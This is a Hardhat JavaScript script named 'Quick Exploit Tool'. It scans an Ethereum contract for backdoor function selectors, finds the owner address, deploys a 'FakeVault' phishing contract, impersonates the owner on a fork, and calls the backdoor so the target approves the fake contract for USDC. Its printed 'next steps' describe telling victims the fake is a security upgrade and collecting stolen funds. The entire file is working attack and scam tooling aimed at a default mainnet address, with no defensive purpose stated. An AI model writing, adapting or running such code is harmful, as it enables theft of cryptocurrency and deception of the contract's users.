const { ethers } = require("hardhat");

/**
 * @title Quick Exploit Tool
 * @notice Rapid exploitation of any contract with backdoors
 * @dev Simplified version for quick attacks
 */

// Known backdoor patterns
const BACKDOORS = {
  execute: "0x78e111f6",        // execute(address,bytes)
  adminCall: "0x9e8c708e",      // adminCall(address,bytes)
  upgrade: "0x3659cfe6",        // upgradeTo(address)
  recover: "0xae169a50",        // recover(address,uint256)
};

async function quickExploit(target) {
  console.log("\n⚡ QUICK EXPLOIT TOOL");
  console.log("====================");
  console.log("Target:", target);
  
  const [attacker] = await ethers.getSigners();
  
  // Step 1: Find backdoor
  console.log("\n1️⃣ Checking for backdoors...");
  
  let foundBackdoor = null;
  for (const [name, selector] of Object.entries(BACKDOORS)) {
    try {
      await ethers.provider.call({
        to: target,
        data: selector + "0000000000000000000000000000000000000000000000000000000000000000"
      });
      console.log(`✅ Found backdoor: ${name}`);
      foundBackdoor = { name, selector };
      break;
    } catch (e) {
      // Continue checking
    }
  }
  
  if (!foundBackdoor) {
    console.log("❌ No backdoors found!");
    return;
  }
  
  // Step 2: Find owner
  console.log("\n2️⃣ Finding privileged address...");
  
  const ownerSlot = await ethers.provider.getStorage(target, 0);
  const owner = "0x" + ownerSlot.slice(-40);
  
  console.log("Found potential owner:", owner);
  
  // Step 3: Deploy fake contract
  console.log("\n3️⃣ Deploying phishing contract...");
  
  const FakeContract = await ethers.getContractFactory("FakeVault");
  const fake = await FakeContract.deploy(target);
  await fake.waitForDeployment();
  
  const fakeAddress = await fake.getAddress();
  console.log("Fake contract:", fakeAddress);
  
  // Step 4: Execute backdoor
  console.log("\n4️⃣ Exploiting backdoor...");
  
  // Fund and impersonate
  await attacker.sendTransaction({
    to: owner,
    value: ethers.parseEther("1.0")
  });
  
  await ethers.provider.send("hardhat_impersonateAccount", [owner]);
  const signer = await ethers.getSigner(owner);
  
  // Make target endorse our fake
  const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  const approveABI = ["function approve(address,uint256)"];
  const iface = new ethers.Interface(approveABI);
  const approveData = iface.encodeFunctionData("approve", [fakeAddress, 1]);
  
  const payload = foundBackdoor.selector +
    "000000000000000000000000" + USDC.slice(2) +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex((approveData.length - 2) / 2, 32).slice(2) +
    approveData.slice(2);
  
  const tx = await signer.sendTransaction({
    to: target,
    data: payload,
    gasLimit: 500000
  });
  
  await tx.wait();
  console.log("✅ Exploit successful:", tx.hash);
  
  // Step 5: Show results
  console.log("\n📊 EXPLOIT COMPLETE!");
  console.log("===================");
  console.log("Backdoor used:", foundBackdoor.name);
  console.log("Fake contract:", fakeAddress);
  console.log("Legitimacy tx:", tx.hash);
  console.log("\nNext steps:");
  console.log("1. Share fake contract address");
  console.log("2. Claim it's a security upgrade");
  console.log("3. Show tx as proof");
  console.log("4. Collect stolen funds");
  
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [owner]);
}

// Run
const target = process.argv[2] || "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

quickExploit(target)
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Error:", error.message);
    process.exit(1);
  });
